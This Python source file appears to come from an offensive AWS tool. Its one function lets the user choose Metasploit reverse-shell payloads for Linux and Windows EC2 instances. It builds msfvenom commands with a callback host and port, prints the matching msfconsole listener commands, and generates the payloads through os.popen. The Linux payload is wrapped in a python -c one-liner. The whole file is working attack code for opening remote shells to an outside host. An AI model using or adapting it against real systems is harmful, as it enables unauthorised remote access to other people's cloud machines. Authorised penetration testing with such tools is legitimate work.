import os

from clint.textui import prompt

from src.helpers.print_output import print_color


def metasploit_installed_multiple_options(linux: bool, windows: bool) -> (str, str):
    """
    Prompts for metasploit  options against a range of EC2 instances depending on their OS.
    :param linux: Whether there are any targeted instances running Linux.
    :param windows: Whether there are any targeted instances running Windows.
    :return: Tuple of metasploit payloads for linux and windows.
    """
    print_color(
        '[*] Choose your metasploit payload. This requires msfvenom to be installed in your system.')
    linux_tcp_meterpreterx64 = 'python/meterpreter/reverse_tcp'
    linux_https_meterpreterx64 = 'python/meterpreter/reverse_https'
    linux_tcp_shell = 'python/shell_reverse_tcp'
    windows_tcp_meterpreterx64 = 'windows/x64/meterpreter/reverse_tcp'
    windows_https_meterpreterx64 = 'windows/x64/meterpreter/reverse_https'
    windows_tcp_shell = 'windows/x64/shell/reverse_tcp'
    linux_attack = ''
    windows_attack = ''

    # remote_ip_host = prompt.query('Your remote IP or hostname to connect back to:')
    # remote_port = prompt.query("Your remote port number:", default="4444")

    if linux:
        linux_options = [
            {'selector': '1', 'prompt': 'Linux Meterpreter reverse TCP x64', 'return': linux_tcp_meterpreterx64},
            {'selector': '2', 'prompt': 'Linux Meterpreter reverse HTTPS x64',
             'return': linux_https_meterpreterx64},
            {'selector': '3', 'prompt': 'Linux TCP Shell', 'return': linux_tcp_shell}]
        linux_payload = prompt.options(
            'Payload for Linux EC2 instances:', linux_options)
        host = prompt.query('Your remote IP or hostname to connect back to:')
        port = prompt.query(
            "Your remote port number (Listener ports should be different for linux and windows):", default="4444")
        linux_msf_shell = 'msfvenom -a python --platform python -p %s LHOST=%s LPORT=%s -f raw --smallest' % (
            linux_payload, host, port)
        print_color(
            '[*] Run the following command on your remote listening server to run the linux payload handler:')
        msfconsole_cmd = "msfconsole -x 'use exploit/multi/handler; set LHOST %s; set lport %s; set payload %s;run -j;'" % (
            host, port, linux_payload)
        print_color(msfconsole_cmd, 'magenta')
        linux_attack = os.popen(linux_msf_shell).read()
        linux_attack = "python -c \"%s\"" % linux_attack
    if windows:
        windows_options = [
            {'selector': '1', 'prompt': 'Windows Meterpreter reverse TCP x64', 'return': windows_tcp_meterpreterx64},
            {'selector': '2', 'prompt': 'Windows Meterpreter reverse HTTPS x64',
             'return': windows_https_meterpreterx64},
            {'selector': '3', 'prompt': 'Windows TCP Shell', 'return': windows_tcp_shell}]
        windows_payload = prompt.options(
            'Payload for Windows EC2 instances:', windows_options)
        host = prompt.query('Your remote IP or hostname to connect back to:')
        port = prompt.query(
            "Your remote port number (Listener ports should be different for linux and windows):", default="5555")
        windows_msf_shell = 'msfvenom -a x64 --platform Windows -p %s LHOST=%s LPORT=%s --f psh-net --smallest' % (
            windows_payload, host, port)
        print_color(
            '[*] Run the following command on your remote listening server to run the windows payload handler:')
        msfconsole_cmd = "msfconsole -x 'use exploit/multi/handler; set LHOST %s; set lport %s; set payload %s;run -j;'" % (
            host, port, windows_payload)
        print_color(msfconsole_cmd, 'magenta')
        windows_attack = os.popen(windows_msf_shell).read()

    return linux_attack, windows_attack
